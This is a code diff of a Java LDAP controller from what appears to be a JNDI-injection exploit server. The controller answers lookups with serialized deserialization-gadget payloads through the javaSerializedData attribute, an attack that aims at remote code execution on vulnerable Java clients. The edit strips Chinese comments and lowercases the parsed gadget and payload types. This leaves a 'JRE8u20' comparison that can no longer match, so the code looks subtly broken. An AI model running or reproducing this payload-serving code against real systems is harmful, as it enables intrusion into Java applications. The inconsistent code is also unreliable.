@@ -52,11 +52,8 @@ public class SerializedDataController implements LdapController {
         byte[] bytes;
 
         try {
-            // 获取与载荷类型相关的有效负载类
             final Class<? extends ObjectPayload> payloadClass = ObjectPayload.Utils.getPayloadClass(String.valueOf(gadgetType));
-            // 实例化有效负载对象
             ObjectPayload payload = payloadClass.newInstance();
-            // 获取有效负载的对象
             Object object = payload.getObject(payloadType, params);
 
             if (SerializedDataController.gadgetType.equals("JRE8u20")) {
@@ -66,13 +63,11 @@ public class SerializedDataController implements LdapController {
                 bytes = Serializer.serialize(object, out);
             }
 
-            // 设置Java类名属性和Java序列化数据属性，并将搜索条目发送至结果中
             e.addAttribute("javaClassName", "foo");
             e.addAttribute("javaSerializedData", bytes);
             result.sendSearchEntry(e);
             result.setResult(new LDAPResult(0, ResultCode.SUCCESS));
         } catch (Throwable er) {
-            // 如果生成或序列化有效负载时出现错误，则打印错误信息和堆栈跟踪
             System.err.println("Error while generating or serializing payload");
             er.printStackTrace();
         }
@@ -93,20 +88,22 @@ public class SerializedDataController implements LdapController {
             int firstIndex  = base.indexOf("/");
             int secondIndex = base.indexOf("/", firstIndex + 1);
             try {
-                gadgetType = base.substring(firstIndex + 1, secondIndex);
+                String Ty2 = base.substring(firstIndex + 1, secondIndex);
+                gadgetType = Ty2.toLowerCase();
                 System.out.println("[+] GaddgetType >> " + gadgetType);
             } catch (IllegalArgumentException e) {
                 throw new UnSupportedGadgetTypeException("UnSupportGaddgetType >> " + base.substring(firstIndex + 1, secondIndex));
             }
             int thirdIndex = base.indexOf("/", secondIndex + 1);
             int fourIndex  = base.indexOf("/", thirdIndex + 1);
-            gadgetType1 = GadgetType.valueOf(base.substring(thirdIndex + 1, fourIndex));
+            String Ty1 = base.substring(thirdIndex + 1, fourIndex);
+            gadgetType1 = GadgetType.valueOf(Ty1.toLowerCase());
             // 若第三个斜杠不存在，则把其设置成为字符串的长度
             if (thirdIndex < 0) thirdIndex = base.length();
             try {
                 // 将类型值设为从第二个斜杠后的字符串到第三个斜杠前（不包括第三个斜杠）所表示的字符串转换为 PayloadType 枚举类型
-                payloadType = PayloadType.valueOf(base.substring(secondIndex + 1, thirdIndex));
-                //System.out.println("[+] PayloadType >> " + payloadType);
+                String Ty3 = base.substring(secondIndex + 1, thirdIndex);
+                payloadType = PayloadType.valueOf(Ty3.toLowerCase());
             } catch (IllegalArgumentException e) {
                 throw new UnSupportedPayloadTypeException("UnSupportedPayloadType: " + base.substring(secondIndex + 1, thirdIndex));
             }
